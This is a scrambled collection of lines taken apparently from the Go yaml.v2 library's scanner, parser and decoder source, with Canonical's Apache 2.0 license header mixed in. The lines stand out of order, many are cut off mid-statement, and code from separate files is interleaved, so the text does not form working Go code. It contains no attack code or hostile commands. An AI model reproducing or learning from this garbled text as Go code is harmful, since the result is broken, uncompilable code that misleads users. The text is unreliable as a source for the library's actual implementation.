// Produce the DOCUMENT-START or DOCUMENT-END token.
return yaml_parser_fetch_stream_start(parser)
"typ:        yaml_STREAM_START_TOKEN,"
// Create the YAML-DIRECTIVE or TAG-DIRECTIVE token.
handle_value) {
((value>>12)
s = append(
if chomping != -1 {
 a mapping
func yaml_parser_increase_flow_level(parser 
"//          SCALAR(""another value"",plain)"
prefix) {
"// Do the same as above, but in the opposite order."
parser.simple_key_allowed = parser.flow_level == 0
"//          SCALAR(""yet another scalar"",single-quoted)"
"// The following two tokens are ""virtual"" tokens denoting the beginning and the"
" is_space(parser.buffer, parser.buffer_pos) {"
"if bytes.Equal(name, []byte(""YAML"")) {"
"//      SCALAR(value,style)             "
 parser.mark.column < indent 
// Is it a plain scalar
"//          [item 1, item 2, item 3]"
 (simple_key.mark.line < parser.mark.line 
buf := parser.buffer
"// If it is a line break, eat it."
"""bytes"""
name = s
// Join the whitespaces or fold line breaks.
// Now it's time to review collection-related tokens. We will start with
"""found character that cannot start any token"")"
handle) {
"if !yaml_parser_scan_uri_escapes(parser, directive, start_mark, "
(parser.buffer[parser.buffer_pos] == '
"yaml_parser_t, context string, context_mark yaml_mark_t, problem string) bool {"
"//          SCALAR(""complex value"")"
switch parser.buffer[parser.buffer_pos
"// line.  If the current line contains only '-', '"
"yaml_parser_t, single bool) bool {"
simple_key.possible = false
"increment = as_digit(parser.buffer, parser.buffer_pos)"
//  - is shorter than 1024 characters.
// Queue is empty.
if len(head) > 1 {
x0A')
// Check for a URI-escaped octet.
 The stream end.
"typ:        yaml_VALUE_TOKEN,"
//            scalar
for (
if simple_key.possible {
// Produce the STREAM-END token and shut down the scanner.
// A simple key is a key which is not denoted by the '
// Check for tab characters that abuse indentation.
0] == '.' 
case 'e':
parser.simple_keys[i]
//            : complex value
//          DOCUMENT-START
if parser.buffer[parser.buffer_pos] == '}' {
"""could not find expected ':'"")"
//      STREAM-END                      
// Reset the simple key on the next level.
indent = max_indent
//          KEY
if code_length > 0 {
var s []byte
"//          TAG(""!!"",""float"")"
handle = s
trailing_breaks = trailing_breaks[:0]
"//      TAG-DIRECTIVE(""!"",""!foo"")"
// Reset simple keys.
(value>>12)))
 parser.error != yaml_NO_ERROR {
need_more_tokens = true
// Example:
// A simple key cannot follow a flow scalar.
"if is_break(parser.buffer, parser.buffer_pos) {"
//      key:
// Is it an alias
// Consume the tag value.
" !yaml_parser_update_buffer(parser, 2) {"
"yaml_parser_t, token "
2)) {
// [Go] Make this logic more reasonable.
"s = make([]byte, 0, 32)"
// Consume the line break.
for parser.indent > column {
// divided on two steps: Scanning and Parsing.
"yaml_insert_token(parser, simple_key.token_number-parser.tokens_parsed, "
"""while scanning for the next token"", parser.mark,"
"if !yaml_parser_roll_indent(parser, parser.mark.column, -1, yaml_BLOCK_MAPPING_START_TOKEN, parser.mark) {"
// Check the list of potential simple keys and remove the positions that
// Is it the end of the stream
"return yaml_parser_set_scanner_error(parser, ""while scanning a %YAML directive"","
//      FLOW-ENTRY
// some cases we are less restrictive that it requires.
func yaml_parser_fetch_next_token(parser 
"start_mark, ""found invalid Unicode character escape code"")"
if length == 0 {
end_mark = parser.mark
// Until the next token is not found.
"// correspondingly.  FLOW-ENTRY represent the ',' indicator.  Finally the"
//      STREAM-START(utf-8)
// Decrease the flow level.
    http://www.apache.org/licenses/LICENSE-2.0
"distributed under the License is distributed on an ""AS IS"" BASIS,"
limitations under the License.
you may not use this file except in compliance with the License.
You may obtain a copy of the License at
"Licensed under the Apache License, Version 2.0 (the ""License"")"
"Unless required by applicable law or agreed to in writing, software"
See the License for the specific language governing permissions and
Copyright 2011-2016 Canonical Ltd.
"WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied."
"start_mark:        start_mark,"
"yaml_version_directive_t,"
token.start_mark)
"start_mark: token.start_mark,"
case yaml_PARSE_FLOW_SEQUENCE_FIRST_ENTRY_STATE:
"""did not find expected ',' or '}'"", token.start_mark)"
} else if token.typ != yaml_FLOW_MAPPING_END_TOKEN {
parser.state = yaml_PARSE_BLOCK_NODE_STATE
default:
"typ:               yaml_DOCUMENT_START_EVENT,"
"return yaml_parser_set_parser_error(parser, ""did not find expected <stream-start>"", token.start_mark)"
case yaml_PARSE_IMPLICIT_DOCUMENT_START_STATE:
// flow_mapping         ::= FLOW-MAPPING-START
parser.state = yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE
 KEY flow_node
token.typ != yaml_STREAM_END_TOKEN {
token = peek_token(parser)
var tag []byte
"parser.states = append(parser.states, yaml_PARSE_FLOW_MAPPING_KEY_STATE)"
func yaml_parser_set_parser_error(parser 
"return yaml_parser_parse_document_content(parser, event)"
token := peek_token(parser)
"start_mark: start_mark,"
if token.typ != yaml_VALUE_TOKEN 
"return yaml_parser_parse_document_end(parser, event)"
"{[]byte(""!""), []byte(""!"")},"
"return yaml_parser_parse_document_start(parser, event, true)"
[]yaml_tag_directive_t) bool {
"return yaml_parser_process_empty_scalar(parser, event, token.start_mark)"
 token.typ == yaml_BLOCK_ENTRY_TOKEN {
"""did not find expected <document start>"", token.start_mark)"
"yaml_parser_t, context string, context_mark yaml_mark_t, problem string, problem_mark yaml_mark_t) bool {"
"return yaml_parser_parse_flow_sequence_entry_mapping_key(parser, event)"
func yaml_parser_parse_flow_mapping_value(parser 
if token.typ != yaml_FLOW_ENTRY_TOKEN 
case yaml_PARSE_BLOCK_SEQUENCE_FIRST_ENTRY_STATE:
parser.state = yaml_PARSE_DOCUMENT_CONTENT_STATE
"parser.states = append(parser.states, yaml_PARSE_BLOCK_MAPPING_KEY_STATE)"
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE:
} else {
"copy(value_copy.prefix, value.prefix)"
//                                            
"yaml_event_t, first bool) bool {"
func yaml_parser_append_tag_directive(parser 
"""found undefined tag handle"", tag_mark)"
case yaml_PARSE_DOCUMENT_END_STATE:
break
// flow_collection      ::= flow_sequence 
if token.major != 1 
if token.typ != yaml_DOCUMENT_START_TOKEN {
"prefix: token.prefix,"
//                           
return true
func yaml_parser_parse(parser 
if len(tag) == 0 {
tag_directives_ref 
"""did not find expected node content"", token.start_mark)"
"""while parsing a block collection"", context_mark,"
parser.marks = parser.marks[:len(parser.marks)-1]
case yaml_PARSE_FLOW_NODE_STATE:
for token.typ == yaml_VERSION_DIRECTIVE_TOKEN 
"parser.states = append(parser.states, yaml_PARSE_DOCUMENT_END_STATE)"
"yaml_event_t, empty bool) bool {"
 ANCHOR TAG
tag_suffix = token.suffix
"""did not find expected '-' indicator"", token.start_mark)"
start_mark := token.start_mark
"yaml_parser_set_parser_error_context(parser,"
 parser.error != yaml_NO_ERROR 
// block_node_or_indentless_sequence    ::=
func yaml_parser_parse_indentless_sequence_entry(parser 
"""did not find expected ',' or ']'"", token.start_mark)"
"return yaml_parser_parse_block_sequence_entry(parser, event, true)"
"tag:        tag,"
if token.typ != yaml_BLOCK_ENTRY_TOKEN 
"end_mark:          end_mark,"
"return yaml_parser_parse_flow_mapping_value(parser, event, true)"
 properties flow_content
 token.typ == yaml_TAG_DIRECTIVE_TOKEN {
tag_token = true
"end_mark:   token.start_mark, // [Go] Shouldn't this be end_mark"
"encoding:   token.encoding,"
func yaml_parser_set_parser_error_context(parser 
 (VALUE flow_node
"typ:        yaml_SEQUENCE_END_EVENT,"
"typ:        yaml_SCALAR_EVENT,"
"context = ""while parsing a block node"""
"return yaml_parser_parse_flow_mapping_key(parser, event, true)"
if token.typ != yaml_FLOW_MAPPING_END_TOKEN {
 token.typ != yaml_VERSION_DIRECTIVE_TOKEN 
"value:           token.value,"
// Parse an implicit document.
"yaml_event_t, implicit bool) bool {"
case yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE:
// properties           ::= TAG ANCHOR
// explicit_document    ::= DIRECTIVE
token.typ == yaml_DOCUMENT_END_TOKEN 
if block {
if len(anchor) > 0 
return false
//                                      
"typ:        yaml_ALIAS_EVENT,"
// [Go] Some of the events below can be merged as they differ only on style.
} else if token.typ != yaml_STREAM_END_TOKEN {
if indentless_sequence 
case yaml_PARSE_FLOW_MAPPING_EMPTY_VALUE_STATE:
func yaml_parser_process_empty_scalar(parser 
"if !yaml_parser_append_tag_directive(parser, value, false, token.start_mark) {"
// implicit_document    ::= block_node DOCUMENT-END
"if !yaml_parser_process_directives(parser, "
"parser.states = append(parser.states, yaml_PARSE_BLOCK_MAPPING_VALUE_STATE)"
version_directive_ref 
switch parser.state {
value := yaml_tag_directive_t{
 properties block_content
yaml_token_t {
//                                                               
"parser.marks = append(parser.marks, token.start_mark)"
parser.state = yaml_PARSE_BLOCK_SEQUENCE_FIRST_ENTRY_STATE
package yaml
"major: token.major,"
var tag_token bool
 token.typ != yaml_BLOCK_END_TOKEN {
// stream   ::= STREAM-START implicit_document
parser.state = yaml_PARSE_BLOCK_MAPPING_FIRST_KEY_STATE
"yaml_parser_set_parser_error(parser,"
token.typ == yaml_DOCUMENT_START_TOKEN 
if token == nil {
version_directive = 
//                          flow_sequence_entry
token.typ != yaml_KEY_TOKEN 
// Parse directives.
// flow_node            ::= ALIAS
if empty {
case yaml_PARSE_BLOCK_MAPPING_KEY_STATE:
 explicit_document
end_mark := token.start_mark
"handle: token.value,"
implicit = false
if version_directive != nil {
"tag = append([]byte(nil), parser.tag_directives[i].prefix...)"
"style:      yaml_style_t(yaml_PLAIN_SCALAR_STYLE),"
token.typ != yaml_BLOCK_END_TOKEN {
func yaml_parser_state_machine(parser 
"handle: make([]byte, len(value.handle)),"
"typ:        yaml_STREAM_START_EVENT,"
"minor: token.minor,"
// flow_content         ::= flow_collection 
if token.typ == yaml_FLOW_SEQUENCE_START_TOKEN {
"yaml_event_t, mark yaml_mark_t) bool {"
parser.state = yaml_PARSE_BLOCK_MAPPING_VALUE_STATE
 DOCUMENT-START block_node
value_copy := yaml_tag_directive_t{
// State dispatcher.
case yaml_PARSE_DOCUMENT_START_STATE:
"style:      yaml_style_t(yaml_FLOW_MAPPING_STYLE),"
"typ:        yaml_SEQUENCE_START_EVENT,"
if allow_duplicates {
yaml_event_t) bool {
parser.state = yaml_PARSE_FLOW_SEQUENCE_FIRST_ENTRY_STATE
"""while parsing a flow mapping"", context_mark,"
"anchor:     token.value,"
// Append a tag directive to the directives stack.
} else if token.typ == yaml_TAG_TOKEN {
"yaml_parser_t, problem string, problem_mark yaml_mark_t) bool {"
parser.state = yaml_PARSE_FLOW_MAPPING_KEY_STATE
parser.state = yaml_PARSE_DOCUMENT_START_STATE
"var tag_handle, tag_suffix, anchor []byte"
tag_handle = token.value
 DOCUMENT-END
"implicit:        implicit,"
if tag_directives_ref != nil {
// Remove the next token from the queue (must be called after peek_token).
 flow_collection 
if first {
parser.state = yaml_PARSE_FLOW_MAPPING_VALUE_STATE
"style:      yaml_style_t(yaml_BLOCK_MAPPING_STYLE),"
if !implicit {
tag_mark = token.start_mark
//                                     
event = yaml_event_t{}
parser.state = yaml_PARSE_END_STATE
token.typ == yaml_STREAM_END_TOKEN {
} else if token.typ != yaml_FLOW_SEQUENCE_END_TOKEN {
// Parse an explicit document.
if token.typ != yaml_STREAM_START_TOKEN {
parser.state = yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE
// flow_sequence_entry  ::= flow_node 
"implicit:   implicit,"
if token.typ == yaml_FLOW_MAPPING_START_TOKEN {
// block_content        ::= block_collection 
"return yaml_parser_parse_flow_sequence_entry(parser, event, true)"
//                    
parser.state = yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE
"tag_directives = append(tag_directives, value)"
func yaml_parser_parse_block_mapping_value(parser 
// The parser implements the following grammar:
 block_mapping
"tag = append(tag, tag_suffix...)"
parser.tokens_parsed
parser.tag_directives = parser.tag_directives[:0]
"if !yaml_parser_append_tag_directive(parser, default_tag_directives[i], true, token.start_mark) {"
func yaml_parser_parse_flow_sequence_entry_mapping_value(parser 
"yaml_parser_t,"
 (len(tag) == 1 
func yaml_parser_parse_block_sequence_entry(parser 
return 
"typ:        yaml_DOCUMENT_END_EVENT,"
// flow_mapping_entry   ::= flow_node 
"return yaml_parser_state_machine(parser, event)"
func yaml_parser_parse_document_content(parser 
} else if token.typ == yaml_BLOCK_END_TOKEN {
parser.state = yaml_PARSE_BLOCK_MAPPING_KEY_STATE
//                          ALIAS
 block_content 
if token.typ == yaml_TAG_TOKEN {
if parser.token_available 
//                                                      
func yaml_parser_parse_document_start(parser 
parser.tokens[parser.tokens_head]
//                          (flow_sequence_entry FLOW-ENTRY)
token.typ != yaml_DOCUMENT_START_TOKEN 
 len(tag) > 0 {
"return yaml_parser_parse_indentless_sequence_entry(parser, event)"
token.typ != yaml_FLOW_MAPPING_END_TOKEN {
//                          (VALUE block_node_or_indentless_sequence
version_directive_ref = version_directive
//                          FLOW-SEQUENCE-END
 token.typ != yaml_FLOW_SEQUENCE_END_TOKEN {
"return yaml_parser_set_parser_error_context(parser,"
                   
for i := range default_tag_directives {
"return yaml_parser_parse_flow_sequence_entry_mapping_end(parser, event)"
// Generate the next event.
// Set parser error.
"start_mark:      start_mark,"
token.typ == yaml_TAG_DIRECTIVE_TOKEN 
"end_mark:   token.start_mark, // [Go] Shouldn't this be token.end_mark"
"anchor:     anchor,"
parser.state = yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE
"return yaml_parser_parse_flow_mapping_value(parser, event, false)"
"typ:        yaml_STREAM_END_EVENT,"
"start_mark: mark,"
// Parse the productions:
"return yaml_parser_parse_node(parser, event, true, true)"
parser.state = yaml_PARSE_IMPLICIT_DOCUMENT_START_STATE
 indentless_block_sequence
"version_directive, "
skip_token(parser)
if token.typ == yaml_ANCHOR_TOKEN {
// block_node           ::= ALIAS
if token.typ == yaml_BLOCK_END_TOKEN {
 yaml_parser_fetch_more_tokens(parser) {
"return yaml_parser_parse_flow_sequence_entry_mapping_value(parser, event)"
//                                                    
var tag_directives []yaml_tag_directive_t
"implicit:   true,"
func yaml_parser_parse_flow_mapping_key(parser 
tag_directives) {
 token.style == yaml_PLAIN_SCALAR_STYLE) 
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_KEY_STATE:
if version_directive_ref != nil {
case yaml_PARSE_FLOW_MAPPING_VALUE_STATE:
"//defer trace(""yaml_parser_parse_node"", ""block:"", block, ""indentless_sequence:"", indentless_sequence)()"
// Get the next event.
implicit := true
func yaml_parser_process_directives(parser 
} else if len(tag) == 0 {
 token.typ == yaml_BLOCK_SEQUENCE_START_TOKEN {
if tag_token {
"""found duplicate %YAML directive"", token.start_mark)"
func yaml_parser_parse_document_end(parser 
 STREAM-END
func yaml_parser_parse_flow_sequence_entry_mapping_key(parser 
// [Go] I suspect the copy is unnecessary. This was likely done
parser.context_mark = context_mark
context_mark := parser.marks[len(parser.marks)-1]
// Peek the next token in the token queue.
parser.state = yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE
anchor = token.value
"copy(value_copy.handle, value.handle)"
if len(tag_handle) == 0 {
if token.typ == yaml_FLOW_ENTRY_TOKEN {
if token.typ == yaml_SCALAR_TOKEN {
if token.typ != yaml_KEY_TOKEN 
"parser.states = append(parser.states, yaml_PARSE_INDENTLESS_SEQUENCE_ENTRY_STATE)"
"parser.states = append(parser.states, yaml_PARSE_FLOW_MAPPING_VALUE_STATE)"
"{[]byte(""!!""), []byte(""tag:yaml.org,2002:"")},"
if token.typ != yaml_FLOW_SEQUENCE_END_TOKEN {
// block_sequence       ::= BLOCK-SEQUENCE-START (BLOCK-ENTRY block_node
"typ:        yaml_DOCUMENT_START_EVENT,"
//                          (flow_mapping_entry FLOW-ENTRY)
"style:           yaml_style_t(token.style),"
"parser.states = append(parser.states, yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE)"
"return yaml_parser_set_parser_error(parser, ""found duplicate %TAG directive"", mark)"
"yaml_parser_t, event "
yaml_version_directive_t
// block_sequence ::= BLOCK-SEQUENCE-START (BLOCK-ENTRY block_node
// indentless_sequence  ::= (BLOCK-ENTRY block_node
"if !yaml_parser_process_directives(parser, nil, nil) {"
"return yaml_parser_parse_stream_start(parser, event)"
parser.problem_mark = problem_mark
case yaml_PARSE_BLOCK_NODE_STATE:
"version_directive: version_directive,"
"implicit:          false,"
plain_implicit = true
"if bytes.Equal(value.handle, parser.tag_directives[i].handle) {"
"""did not find expected key"", token.start_mark)"
"parser.states = append(parser.states, yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE)"
"""found incompatible YAML document"", token.start_mark)"
token.typ != yaml_FLOW_SEQUENCE_END_TOKEN {
func yaml_parser_parse_flow_sequence_entry_mapping_end(parser 
// stream               ::= STREAM-START implicit_document
var tag_mark yaml_mark_t
// Parse the production:
"typ:             yaml_SCALAR_EVENT,"
mark := token.end_mark
//                          
"quoted_implicit: false,"
quoted_implicit = true
"tag:             tag,"
"value:      nil, // Empty"
 BLOCK-END
parser.context = context
if token.typ == yaml_KEY_TOKEN {
"yaml_event_t, block, indentless_sequence bool) bool {"
if token.typ == yaml_VERSION_DIRECTIVE_TOKEN {
 flow_content
             
 indentless_block_sequence)
"tag_directives:    tag_directives,"
"parser.tag_directives = append(parser.tag_directives, value_copy)"
"typ:        yaml_MAPPING_START_EVENT,"
case yaml_PARSE_DOCUMENT_CONTENT_STATE:
"return yaml_parser_parse_flow_mapping_key(parser, event, false)"
parser.state = yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_KEY_STATE
"panic(""invalid parser state"")"
tag_suffix = nil
func skip_token(parser 
"return yaml_parser_process_empty_scalar(parser, event,"
for token.typ == yaml_DOCUMENT_END_TOKEN {
// Erase the event object.
parser.state = yaml_PARSE_FLOW_MAPPING_FIRST_KEY_STATE
"implicit:        plain_implicit,"
var default_tag_directives = []yaml_tag_directive_t{
end_mark = token.end_mark
"return yaml_parser_parse_document_start(parser, event, false)"
// because there was no way to track ownership of the data.
//                          BLOCK-END
"context := ""while parsing a flow node"""
case yaml_PARSE_BLOCK_SEQUENCE_ENTRY_STATE:
"return yaml_parser_parse_block_mapping_key(parser, event, false)"
"end_mark:        end_mark,"
"yaml_parser_set_parser_error_context(parser, context, start_mark,"
} else if token.typ == yaml_TAG_DIRECTIVE_TOKEN {
"if bytes.Equal(parser.tag_directives[i].handle, tag_handle) {"
"return yaml_parser_parse_node(parser, event, true, false)"
return nil
"parser.states = append(parser.states, yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE)"
if (len(tag) == 0 
"""bytes"""
tag = tag_suffix
//                          FLOW-MAPPING-END
// Parse the stream end.
parser.states = parser.states[:len(parser.states)-1]
           
yaml_parser_t) {
"return yaml_parser_parse_block_mapping_value(parser, event)"
for i := range parser.tag_directives {
"typ:        yaml_MAPPING_END_EVENT,"
func yaml_parser_parse_node(parser 
"var plain_implicit, quoted_implicit bool"
yaml_version_directive_t{
var version_directive 
 token.minor != 1 {
"prefix: make([]byte, len(value.prefix)),"
"return yaml_parser_parse_flow_sequence_entry(parser, event, false)"
 token.typ != yaml_FLOW_MAPPING_END_TOKEN {
 token.typ == yaml_BLOCK_MAPPING_START_TOKEN {
end_mark := token.end_mark
"return yaml_parser_process_empty_scalar(parser, event, mark)"
tag_directives_ref = tag_directives
parser.stream_end_produced = parser.tokens[parser.tokens_head].typ == yaml_STREAM_END_TOKEN
                  
// Generate an empty scalar event.
 block_content
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_END_STATE:
"style:      yaml_style_t(yaml_FLOW_SEQUENCE_STYLE),"
if implicit 
 parser.state == yaml_PARSE_END_STATE {
//                          flow_mapping_entry
 properties (block_content 
func yaml_parser_parse_flow_sequence_entry(parser 
"end_mark:   mark,"
"end_mark:   end_mark,"
//                                   
if token.typ == yaml_DOCUMENT_END_TOKEN {
if token.typ == yaml_VALUE_TOKEN {
yaml_parser_t) 
case yaml_PARSE_FLOW_MAPPING_FIRST_KEY_STATE:
import (
"return yaml_parser_parse_block_sequence_entry(parser, event, false)"
// Parse extra document end indicators.
case yaml_PARSE_BLOCK_MAPPING_VALUE_STATE:
case yaml_PARSE_STREAM_START_STATE:
//              
// flow_sequence        ::= FLOW-SEQUENCE-START
case yaml_PARSE_BLOCK_NODE_OR_INDENTLESS_SEQUENCE_STATE:
"end_mark:   token.end_mark,"
 flow_mapping
// block_mapping        ::= BLOCK-MAPPING_START
"""while parsing a flow sequence"", context_mark,"
 SCALAR
if token.typ == yaml_BLOCK_ENTRY_TOKEN {
// No events after the end of the stream or error.
"""while parsing a node"", start_mark,"
token.typ != yaml_FLOW_ENTRY_TOKEN 
"quoted_implicit: quoted_implicit,"
if block 
case yaml_PARSE_BLOCK_MAPPING_FIRST_KEY_STATE:
"parser.states = append(parser.states, yaml_PARSE_FLOW_SEQUENCE_ENTRY_STATE)"
"style:      yaml_style_t(yaml_BLOCK_SEQUENCE_STYLE),"
event = yaml_event_t{
case yaml_PARSE_FLOW_SEQUENCE_ENTRY_MAPPING_VALUE_STATE:
parser.token_available = false
// block_collection     ::= block_sequence 
if token.typ == yaml_ALIAS_TOKEN {
token.typ != yaml_VALUE_TOKEN 
func peek_token(parser 
"return yaml_parser_parse_node(parser, event, false, false)"
parser.tokens_head
case yaml_PARSE_FLOW_MAPPING_KEY_STATE:
func yaml_parser_parse_block_mapping_key(parser 
"style:           yaml_style_t(yaml_PLAIN_SCALAR_STYLE),"
"""while parsing a block mapping"", context_mark,"
if parser.stream_end_produced 
func yaml_parser_parse_stream_start(parser 
parser.error = yaml_PARSER_ERROR
"anchor:          anchor,"
implicit := len(tag) == 0
//                            
 tag[0] == '!') {
"parser.states = append(parser.states, yaml_PARSE_FLOW_MAPPING_EMPTY_VALUE_STATE)"
parser.problem = problem
"yaml_parser_t, value yaml_tag_directive_t, allow_duplicates bool, mark yaml_mark_t) bool {"
if token.typ == yaml_VERSION_DIRECTIVE_TOKEN 
if !first {
//                          ((KEY block_node_or_indentless_sequence
"//trace(""yaml_parser_state_machine"", ""state:"", parser.state.String())"
"return yaml_parser_parse_block_mapping_key(parser, event, true)"
token.typ != yaml_TAG_DIRECTIVE_TOKEN 
parser.state = parser.states[len(parser.states)-1]
start_mark = token.start_mark
//                                                                      
err)
et := out.Type().Elem()
field = out.FieldByIndex(info.Inline)
return good
decoder) setMapIndex(n 
"n.children = append(n.children, p.parse())"
n := p.node(documentNode)
p.fail()
parser) fail() {
default:
if d.strict 
n := p.node(sequenceNode)
err := u.UnmarshalYAML(func(v interface{}) (err error) {
return n
p.parser) {
n.tag = string(p.event.tag)
inlineMap.Set(reflect.New(inlineMap.Type()).Elem())
case yaml_SEQUENCE_START_EVENT:
mapItemType    = reflect.TypeOf(MapItem{})
"value = "" "
"doneFields = make([]bool, len(sinfo.FieldsList))"
yaml_parser_set_input_string(
text = []byte(n.value)
d.mapType = outt
"d, err := time.ParseDuration(resolved)"
item.Key).Elem()
out.Set(reflect.ValueOf(resolved))
case reflect.Interface:
d.merge(n.children[i
"if n.tag == """" "
"failf(""invalid map key: %"
decoder) mappingStruct(n 
failWantMap()
p.expect(yaml_MAPPING_END_EVENT)
node{
time.Time{})
n.value = string(p.event.value)
parser {
decoder) callUnmarshaler(n 
func newParser(b []byte) 
"d.terrors = append(d.terrors, e.Errors...)"
if !out.OverflowUint(uint64(resolved)) {
"return d.alias(n, out)"
"failf(""unknown anchor '%s' referenced"", n.value)"
yaml_event_delete(
decoder) document(n 
 out.Type() == resolvedv.Type() {
parser) document() 
if line != 0 {
"failf(""!!binary value contains invalid base64 data"")"
if out.Type() == durationType {
"1], v) {"
n := p.node(scalarNode)
"// peek peeks at the next event in the event stream,"
// ----------------------------------------------------------------------------
if ok 
} else {
"// We've resolved to exactly the type we want, so use that."
var resolved interface{}
elemType = inlineMap.Type().Elem()
p.doc.anchors[string(anchor)] = n
if resolved == nil {
"good = d.callUnmarshaler(n, u)"
var zeroValue reflect.Value
type decoder struct {
if resolvedv := reflect.ValueOf(resolved)
text = []byte(resolved.(string))
return true
ni := n.children[i]
"// Decoder, unmarshals a node into a provided value."
kkind := k.Kind()
out.Set(reflect.Zero(out.Type()))
} else if sinfo.InlineMap != -1 {
// expect consumes an event from the event stream and
case int:
if resolved != nil {
"if ok := d.unmarshal(n.children[i], e)"
item := MapItem{}
outt := out.Type()
if kkind == reflect.Map 
"node, out reflect.Value) (good bool) {"
parser) destroy() {
node {
p.expect(yaml_MAPPING_START_EVENT)
tag = n.tag
"an, ok := d.doc.anchors[n.value]"
"p.parser, r)"
yaml_parser_set_input_reader(
" n.value == """
"p.parser.problem = fmt.Sprintf(""expected %s event but got %s"", e, p.event.typ)"
"// That might be more lax than we'd like, but the"
out.SetInt(int64(resolved))
decoder) mappingSlice(n 
func failWantMap() {
terrlen := len(d.terrors)
" "": """
n.alias = p.doc.anchors[n.value]
 tag != yaml_MAP_TAG {
"tag, resolved = resolve(n.tag, n.value)"
if resolved <= math.MaxInt64 
switch out.Kind() {
"out, unmarshaled, good := d.prepare(n, out)"
mapType := d.mapType
"// unmarshalling was already done by UnmarshalYAML, and if so whether"
case reflect.Bool:
"decoder{mapType: defaultMapType, strict: strict}"
"data, err := base64.StdEncoding.DecodeString(resolved.(string))"
var msg string
// set its value.
d.terrors = d.terrors[:terrlen]
var l = len(n.children)
tag          string
return false
iface := out
"if n.tag != """" {"
 i >= 0
func (p 
"""io"""
if isMerge(ni) {
for p.peek() != yaml_SEQUENCE_END_EVENT {
func newParserFromReader(r io.Reader) 
} else if p.parser.context_mark.line != 0 {
"case reflect.Float32, reflect.Float64:"
node
inlineMap = out.Field(sinfo.InlineMap)
k := reflect.ValueOf(
again = true
l := len(n.children)
decoder) merge(n 
var (
func isMerge(n 
"panic(""attempted to parse unknown event: "" "
p.expect(yaml_SEQUENCE_START_EVENT)
case documentNode:
if err == nil {
package yaml
 out.MapIndex(k) != zeroValue {
d.unmarshal(n.children[i
if out.CanAddr() {
yaml_parser_delete(
parser) node(kind int) 
"node, out reflect.Value) (newout reflect.Value, unmarshaled, good bool) {"
// timestamp-like values into interface{} will continue to
if out.Kind() != reflect.Array {
var elemType reflect.Type
" n.tag == """" "
parser) sequence() 
case yaml_DOCUMENT_START_EVENT:
kind         int
value    string
n.implicit = p.event.implicit
 strconv.Itoa(n.kind))
p := parser{}
if out.Type().Elem() == reflect.TypeOf(resolved) {
if resolved >= 0 
decoder) mapping(n 
out.SetFloat(float64(resolved))
"""strconv"""
"d.terrors = append(d.terrors, fmt.Sprintf(""line %d: cannot unmarshal %s%s into %s"", n.line"
"node, out, k, v reflect.Value) {"
} else if tag == yaml_TIMESTAMP_TAG {
 n.tag == yaml_MERGE_TAG)
v := reflect.ValueOf(i)
"delete(d.aliases, n)"
" (n.value == ""null"" "
"good = d.scalar(n, out)"
e := reflect.New(et).Elem()
sv := reflect.New(v.Type()).Elem()
TypeError{issues}
// Happens when attempting to decode an empty buffer.
"1], out)"
value := n.value
switch resolved := resolved.(type) {
case reflect.Ptr:
"line:   p.event.start_mark.line,"
documentNode = 1 << iota
slicev := reflect.New(d.mapType).Elem()
d.mapType = mapType
// if a value is found to implement it.
return p.sequence()
if !out.OverflowInt(resolved) {
out.Set(slicev)
case reflect.Slice:
decoder) unmarshal(n 
p.doneInit = true
out.Set(reflect.ValueOf(n.value))
p.expect(yaml_ALIAS_EVENT)
"1], inlineMap, name, value)"
decoder) prepare(n 
if out.Kind() == reflect.Map 
 p.event.typ.String())
"out.Set(out.Slice(0, j))"
p.event.typ = yaml_NO_EVENT
"good = d.unmarshal(n.alias, out)"
if err != nil {
" n.value == ""<<"" "
return d
"""fmt"""
TypeError)
"return d.mappingStruct(n, out)"
"1, k.Interface()))"
d.aliases = make(map[
"""reflect"""
"node, out reflect.Value) bool {"
var slice []MapItem
func resetMap(out reflect.Value) {
item.Value).Elem()
p.expect(yaml_DOCUMENT_START_EVENT)
resolved = n.value
if d.strict {
"failf(""invalid array: want %d elements but got %d"", out.Len(), l)"
parser) peek() yaml_event_type_t {
var tag string
field = out.Field(info.Num)
durationType   = reflect.TypeOf(time.Duration(0))
"return d.document(n, out)"
children []
out.Set(elem)
if p.event.typ != e {
case int64:
"slice = append(slice, item)"
out.SetString(n.value)
func (d 
k := reflect.New(kt).Elem()
"""time"""
return 
// Scanner errors don't iterate line before returning error
"return d.mappingSlice(n, out)"
value := reflect.New(elemType).Elem()
// Step backwards as earlier nodes take precedence.
out.Set(reflect.ValueOf(slice))
"1], out, k, e)"
"d.terrors = append(d.terrors, fmt.Sprintf(""line %d: field %s not found in type %s"", ni.line"
"1], value)"
case reflect.String:
// Perhaps we can use the value as a TextUnmarshaler to
"if e, ok := err.("
if p.doneInit {
 n.kind == scalarNode 
// checks that it's of the expected type.
iface = out
"// Parser, produces a node tree out of a libyaml event stream."
"d.unmarshal(n, out)"
 an.kind != mappingNode {
n := p.node(aliasNode)
alias    
if n.tag == yaml_NULL_TAG 
mapType reflect.Type
return p.mapping()
parser) parse() 
"msg = ""unknown problem parsing YAML content"""
type node struct {
doc     
if d.unmarshal(n.children[i
switch p.peek() {
again = false
"out.SetMapIndex(k, zeroValue)"
// puts the results into p.event and returns the event type.
if p.event.typ == yaml_STREAM_END_EVENT {
d.doc = n
if sinfo.InlineMap != -1 {
v := reflect.ValueOf(
const (
// TODO DOes this make sense
out.SetFloat(resolved)
decoder {
implicit bool
line
p.expect(yaml_DOCUMENT_END_EVENT)
var text []byte
case yaml_ALIAS_EVENT:
"d.terrors = append(d.terrors, fmt.Sprintf(""line %d: key %"
"if !d.unmarshal(ni, name) {"
// its types unmarshalled appropriately.
if p.event.typ == yaml_NO_EVENT {
mappingNode
out = reflect.MakeMap(d.mapType)
event    yaml_event_t
b = []byte{'
p.event)
